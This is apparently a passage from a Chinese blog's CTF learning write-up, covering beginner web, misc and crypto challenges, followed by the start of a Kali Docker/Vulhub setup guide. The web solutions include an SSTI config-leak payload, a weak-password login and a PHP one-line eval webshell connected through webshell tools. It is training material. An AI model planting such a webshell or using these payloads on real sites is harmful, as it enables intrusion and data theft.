-<li>SECRET_KEY：flask中的一种配置属性，flask涉及安全的东西需要用这个SECRET_KEY密钥进行加密</li>
-</ul>
-<p>到这里基本上可以确定题目的 flag 就藏在 SECRET_KEY 中，首先测试一下是否能回显，显示成功即表示存在该漏洞：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580436166187.jpg"><br>接下来通过 <code>?flag=&#123;&#123;config&#125;&#125;</code> 看一下哪些全局变量可用，没想到 flag 直接出来了，比较简单<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580436726542.jpg"><br>或者也可以通过在 URL 补充语句 <code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</code> 得到 flag </p>
-<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h4><blockquote>
-<p>描述: key{}</p>
-</blockquote>
-<p>根据题目描述我们猜测此题的 flag 格式为 <code>key&#123;&#125;</code> ，题目下载得到一张如下图片：</p>
-<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/file.jpg" alt="file"><br>单看图片没发现什么问题，用 HexFiend 或 WinHex等十六进制编辑器打开查看，企图找到 ctf、CTF、flag、key 等关键字，结果发现一串很有意思的编码：</p>
-<p><img src="/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF//CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/pichex.png" alt="pichex"><br>通过 <strong>Unicode</strong> 解密可得到 flag </p>
-<h4 id="社工-进阶收集"><a href="#社工-进阶收集" class="headerlink" title="社工-进阶收集"></a>社工-进阶收集</h4><blockquote>
-<p>提示: flag{小美小区名字拼音}</p>
-</blockquote>
-<blockquote>
-<p>描述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编 难度降低)</p>
-</blockquote>
-<p>下载题目发现是一张简单说说对话截图，根据图片我们可以得到一些信息：</p>
-<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580448564615.jpg"></p>
-<ul>
-<li>图片内容：西安大雁塔（可通过百度识图找到）</li>
-<li>七站地铁到达大雁塔</li>
-<li>途中地铁需要转一站</li>
-<li>始发地地铁上车，离家800多米</li>
-<li>第二站地铁上车，离家1公里多</li>
-</ul>
-<p>纯纯就是翻看西安地图。。。。 研究地铁路线图不难发现小美应该是在韦曲南地铁站上车，她家就在韦曲南和航天城两个站之间<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580450931943.jpg"><br>打开百度地图看看韦曲南和航天站距离，从韦曲南开始查看800米左右附件的小区，挨个试试：</p>
-<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/xiaomei.png" alt="xiaomei"><br>最后发现是兰乔国际城， <code>flag&#123;lanqiaoguojicheng&#125;</code></p>
-<h3 id="Cypto"><a href="#Cypto" class="headerlink" title="Cypto"></a>Cypto</h3><h4 id><a href="#" class="headerlink" title="/.-"></a>/.-</h4><blockquote>
-<p>描述:<br>..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-</p>
-</blockquote>
-<p>显而易见这就是 <strong>摩斯密码</strong>，找个网址解密即可得到 flag</p>
-<h4 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h4><blockquote>
-<p>描述: 一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p>
-</blockquote>
-<p>搜索发现这是 <strong>栅栏密码</strong>，找到工具 <a href="https://ctf.bugku.com/tool/railfence">栅栏加解/密</a> ，输入栏数 <code>2</code> 和密文 <code>fa&#123;fe13f590lg6d46d0d0&#125;</code> 解密即破：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580462553718.jpg"></p>
-<h4 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h4><blockquote>
-<p>描述: +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;— —– —.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- —– &lt;]&gt;– —– -.–. —-. –.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; —– -&lt;]&gt;- —– —-. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. —-. ++++. &lt;++++ +++[- &gt;—- —&lt;] &gt;—- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</p>
-</blockquote>
-<p>这什么东西？？？？<br>通过搜索发现它是 <strong>Brainfuck</strong> 语言，找到网站尝试解密 <a href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a><br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580466034211.jpg"><br>成功得到 flag 啦～</p>
-<h4 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h4><blockquote>
-<p>描述: Ook.</p>
-</blockquote>
-<p>omg 文件下载打开之后发现截图都截不完，全是 <code>Ook</code> 这个字符，不过观察发现标点符号是不一样的，嗯？这里面一定有问题！ 搜索发现竟然还有一种编码就叫做 <strong>Ook</strong> 编码，利用 <a href="https://tool.bugku.com/brainfuck/">编码工具</a> 解码得到 flag </p>
-<h4 id="抄错的字符"><a href="#抄错的字符" class="headerlink" title="抄错的字符"></a>抄错的字符</h4><blockquote>
-<p>描述: 老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</p>
-</blockquote>
-<p>题目可知给出的字符串中的每个字符原来可能是大小写字母或数字，那我就直接暴力枚举了，优先级：数字 &gt; 小写字母 &gt; 大写字母，然后将枚举出来的字符进行解密（盲猜 base64 ，通过评论区确认）。随便找到一个 <a href="https://base64.us/">base64解码网站</a> ，将可能抄错的英文字母换成数字，然后切换几个大小写字母（随机），不是乱码但看起来好像也不太对劲？：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/base64string.png" alt="base64string"><br>反复尝试终于找到一个貌似正确的内容（题目作者: Aman）： <code>QW1hbl92ZXJ5X2Nvb2w</code> ，解码得到 <code>Aman_very_cool</code> ，加上 flag 框架即可成功提交答案</p>
-<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>知识盲区。。。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>知识盲区➕1</p>
-<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><p>这个怎么签到题都不给一个啊 害😮‍💨</p>
-<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h4><blockquote>
-<p>描述: X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
-</blockquote>
-<p>打开网页发现无法点击右键 <strong>查看网页源代码</strong> ，于是通过 <code>F12</code> 查看网页源代码找到 flag</p>
-<h4 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h4><blockquote>
-<p>描述: X老师告诉小宁同学 <strong>HTTP通常使用两种请求方法</strong> ，你知道是哪两种吗？</p>
-</blockquote>
-<p>根据网页描述通过 <code>get</code> 方法传入参数 <code>a=1</code>， 然后再通过 <code>hackbar</code> 插件或 <code>burpsuite</code> 软件传入参数 <code>b=2</code>，然后执行得到 flag<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580489573238.jpg" alt="16580489573238"></p>
-<h4 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h4><blockquote>
-<p>描述: X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p>
-</blockquote>
-<p><strong>Robots协议</strong> 就是爬虫协议，直接访问 <code>robots.txt</code>文件：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580488399367.jpg"><br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580488469803.jpg"><br>发现 flag 所在文件 <code>flag_1s_h3re.php</code>，访问此网页即可得到</p>
-<h4 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h4><blockquote>
-<p>描述: X老师忘记删除备份文件，他派小宁同学去把备份文件找出来，一起来帮小宁同学吧！</p>
-</blockquote>
-<p>进入答题网址后，发现是需要找 index.php 的备份文件，搜索发现 <strong>备份文件后缀名</strong> 为 .bak ，访问下载 index.pgp.bak 文件打开发现 flag</p>
-<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><blockquote>
-<p>描述: X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p>
-</blockquote>
-<p>进入答题网址后，提示我们查看 cookie ，<code>F12 -&gt; Network -&gt;cookie</code>：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580497234917.jpg"><br>根据提示访问 cookie.php ，页面又提示我们查看 http 响应头，发现 flag ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580497852930.jpg"></p>
-<h4 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h4><blockquote>
-<p>描述: X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
-</blockquote>
-<p>又是一个前端限制题目，直接 F12 定位到 flag 处的代码，发现设置了 button 不可点，删除 disabled 回车就可以点击按钮了，然后得到 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580499738618.jpg"></p>
-<h4 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h4><blockquote>
-<p>描述: 小宁写了一个登陆验证页面，随手就设了一个密码。</p>
-</blockquote>
-<p>根据题目描述首先想到爆破（还是弱口令），随手一试 <code>admin:123456</code> 就出来了。。。<br>正经步骤：burp 弱口令字典爆破</p>
-<h4 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h4><blockquote>
-<p>描述: 小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
-</blockquote>
-<p>看题目就是一个简单 php 代码审计的意思，通过 <code>GET</code> 方法得到 <code>a</code> 和 <code>b</code> 的值：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580502749061.jpg"><br>根据代码：<code>b</code>不能是整数或纯数字字符串，且值大于1234，那么我们可以构造个 <code>12345a</code>，于是 payload 构造为 <code>?a==0&amp;b=12345a</code> 回车得到 flag</p>
-<h4 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h4><blockquote>
-<p>描述: X老师告诉小宁其实xff和referer是可以伪造的。</p>
-</blockquote>
-<p>根据描述和题目很容易猜到此题就是要构造 <strong>xff</strong> 和 <strong>referer</strong> ，打开第一步就是叫我们伪造 ip 地址，也就是伪造 xff 来，burpsuite 抓包后 Send to Repeater，直接在请求里面添加 <code>X-Forwarded-For: 123.123.123.123</code> ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582004268805.jpg"></p>
-<p>这时在 Response 里看到下一步提示 必须来源于 <a href="https://www.google.com/">https://www.google.com</a> ，说明叫我们修改 referer ，和上一步一样的办法，在请求里面添加 <code>Referer: https://www.google.com</code> ，点击发送得到 flag :<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582004458456.jpg"></p>
-<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><blockquote>
-<p>描述: 小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p>
-</blockquote>
-<p>根据题意可知是 PHP <strong>一句话木马</strong> ，启动场景可以看到这句话具体内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里我们需要用一种 <strong>webshell</strong> 的工具，比如“菜刀”或者是“蚁剑”之类的，具体配置：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582008518924.jpg"><br>连接成功后拿到权限很容易找到 <code>flag.txt</code> 文件：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582009188308.jpg"></p>
-<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h4><blockquote>
-<p>描述:<br>Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p>
-</blockquote>
-<p>啊！！签到题这不就来了吗？！ 竟然难度 2🌟  。。。</p>
-<h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><blockquote>
-<p>描述: 菜猫给了菜狗一张图，说图下面什么都没有</p>
-</blockquote>
-<p>打开图片后发现是 PDF 文件，预览显示和图片无差，尝试转成 word 文档打开，移开图片发现 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582287976918.jpg"></p>
-<h4 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h4><blockquote>
-<p>描述: 菜狗为了打败菜猫，学了一套如来十三掌。</p>
-</blockquote>
-<p>附件打开里面是一段看不懂的文字，但是也能看出这应该是一段佛文，立马想到【与佛论禅】（注意格式一定要加上：<code>佛曰：</code>），解密得到<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code> ，但输入发现不是正确 flag ，继续分析题目，联想到 <strong>rot13</strong> ，解码得到<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code> ，输入依然错误，这时机智的来了一个 base64解密 ，顺利拿下 <code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></p>
-<h4 id="转轮机加密"><a href="#转轮机加密" class="headerlink" title="转轮机加密"></a>转轮机加密</h4><blockquote>
-<p>描述:<br>你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。flag，是字符串，小写。</p>
-</blockquote>
-<p>题目得到一个重要信息：托马斯·杰斐逊，发现这应该是 <strong>杰斐逊转轮密码</strong> ，没有解密器，就只能自己手动计算了：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6</span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure>
-
-<p>根据密钥第一个数是 2 ，密文第一个是 N ，选择加密表 <code>2：&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</code> ，把 N 后面的提前， N 前面的放后面 <code>NACZDTRXMJQOYHGVSFUWIKPBEL</code> ， 其他的类似：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582314749300.jpg"><br>发现倒数第九列的字母可以拼出意思， <code>fireinthehole</code> （这个就是flag了，不用加其他的东西）</p>
-<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><blockquote>
-<p>描述:<br>元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。<br>你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p>
-</blockquote>
-<p>下载附件发现就是一段 base64 编码，找个网站解码即可得到 flag</p>
-<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/base64.png" alt="base64"></p>
-<h4 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h4><blockquote>
-<p>描述:<br>你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p>
-</blockquote>
-<p>根据题目提示 Caesar 知道是 <strong>凯撒密码</strong>， 搜索找到在线解密网站。根据凯撒原理我们合理猜测 flag 格式为 <code>cyberpeace&#123;&#125;</code> ，计算得到 <code>o</code> 与 <code>c</code> 的差为12（或者挨个尝试1-25），发现位移 12 得到正确 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16581992278104.jpg"></p>
-<h4 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h4><blockquote>
-<p>描述:<br>小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p>
-</blockquote>
-<p>打开附件发现写着一串二进制字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</span><br></pre></td></tr></table></figure>
-
-<p>根据题目我们知道这是 <strong>摩斯密码</strong> ，但和常规 <code>.-</code> 形式不太一样，找到一个解密网站，根据 <code>. = 0 &amp;&amp; - = 1</code> 将上串二进制字符改为摩斯密码的形式解密得到 flag 内容，再添加个格式框即可</p>
-<h4 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h4><blockquote>
-<p>描述:<br>被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p>
-</blockquote>
-<p>题目的翻译是“铁栅栏”，根据提示很容易便能想到分 5 栏的 <strong>栅栏密码</strong>，找到网站设置栏目数为 5 解密即可得到 flag</p>
-<h4 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h4><blockquote>
-<p>描述:<br>“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p>
-</blockquote>
-<p>首先一串 <code>.-</code> 字符直接 <strong>摩斯密码</strong> 解密：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Morseandpeigen.png" alt="Morseandpeigen"></p>
-<p>得到提示 <code>MAY_BE_HAVE_ANOTHER_DECODE</code> ，还有一串 <code>A</code> <code>B</code> 组成的字符，发挥脑子和搜索🔍，发现符合 <strong>培根密码</strong> 形式（也满足描述所说一种食物），解密即可得到flag</p>
-<h4 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h4><blockquote>
-<p>描述:<br>经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}</p>
-</blockquote>
-<p>打开附件发现两个等号和数字大小写组合字符，典型的base64编码型，直接转换得到一堆 &amp;# ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582027281003.jpg"></p>
-<p>猜测 <strong>Unicode编码</strong> 或 Hex ，又转出一串三位数的像 <strong>ASCII编码</strong> 的东西：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582028335080.jpg"><br>对照 ASCII 码字符表可得到 flag （也可以写个脚本切割识别）</p>
-<h4 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h4><blockquote>
-<p>描述:<br>你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}</p>
-</blockquote>
-<p>由题意可知此题为 <strong>幂数加密</strong>，附件里的内容为 <code>8842101220480224404014224202480122</code>，<br>而正常的二进制幂数加密只有 <code>0</code>、<code>1</code>、<code>2</code>、<code>3</code>、<code>4</code>、<code>5</code>，是不会出现 8 的，通过百度了解到这其实是 <strong>云影密码</strong> ，以 0 为分隔符，我们将每个字母的密文相加得推出英文字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8+8+4+2+1=23 --&gt; W</span><br><span class="line">1+2+2=5 --&gt; E</span><br></pre></td></tr></table></figure>
-
-<p>依次计算得到 <code>WELLDONE</code> ，就是所需要的</p>
-<h3 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h3><p>还有手机专场啊🤔</p>
-<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><p>下次一定。</p>
-<h3 id="PWN-1"><a href="#PWN-1" class="headerlink" title="PWN"></a>PWN</h3><p>好得很哇^_^</p>
-<hr>
-<h1 id="一些知识补充"><a href="#一些知识补充" class="headerlink" title="一些知识补充"></a>一些知识补充</h1><h2 id="服务器模版注入-SSTI"><a href="#服务器模版注入-SSTI" class="headerlink" title="服务器模版注入 SSTI"></a>服务器模版注入 SSTI</h2><h2 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h2><h2 id="摩斯密码-Morse"><a href="#摩斯密码-Morse" class="headerlink" title="摩斯密码 Morse"></a>摩斯密码 Morse</h2><h2 id="Brainfuck-Ook-语言"><a href="#Brainfuck-Ook-语言" class="headerlink" title="Brainfuck/Ook! 语言"></a>Brainfuck/Ook! 语言</h2><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h2><p>三种方式：</p>
-<ul>
-<li>右键，选择查看网页源代码</li>
-<li>F12，选择elements</li>
-<li>网页地址栏前面加上 <code>view-source:</code></li>
-</ul>
-<h2 id="HTTP两种请求方法"><a href="#HTTP两种请求方法" class="headerlink" title="HTTP两种请求方法"></a>HTTP两种请求方法</h2><ul>
-<li>GET: 在 URL 后添加参数 <code>?/变量名=值</code></li>
-<li>POST: 打开 HackBar ，选择 post data，在下面文本框内输入参数 <code>变量名=值</code></li>
-</ul>
-<h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h2><p>Robots 协议也称爬虫协议、爬虫规则等，是指网站可建立一个 <code>robots.txt</code> 文件来告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取 <code>robots.txt</code> 文件来识别这个页面是否允许被抓取。</p>
-<h2 id="xff-and-referer"><a href="#xff-and-referer" class="headerlink" title="xff and referer"></a>xff and referer</h2><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell"></a>webshell</h2><h2 id="备份文件后缀名"><a href="#备份文件后缀名" class="headerlink" title="备份文件后缀名"></a>备份文件后缀名</h2><p>常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” </p>
-<h2 id="凯撒密码-Caesar"><a href="#凯撒密码-Caesar" class="headerlink" title="凯撒密码 Caesar"></a>凯撒密码 Caesar</h2><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>培根密码只包含了两种不同的字符’A’和’B’，转换规则如下：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582025319658.jpg"></p>
-<h2 id="ASCII-码"><a href="#ASCII-码" class="headerlink" title="ASCII 码"></a>ASCII 码</h2><h2 id="幂数加密-amp-云影密码"><a href="#幂数加密-amp-云影密码" class="headerlink" title="幂数加密 &amp; 云影密码"></a>幂数加密 &amp; 云影密码</h2><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><h2 id="杰斐逊转轮密码"><a href="#杰斐逊转轮密码" class="headerlink" title="杰斐逊转轮密码"></a>杰斐逊转轮密码</h2>]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux安装Docker和Vulhub步骤</title>
-    <url>/2022/07/04/Linux%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub%E6%AD%A5%E9%AA%A4/</url>
-    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
-
-<p>!(1.root切换)[kali切换root用户]</p>
-<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
-
-<p>下载docker引擎并查看其版本：</p>
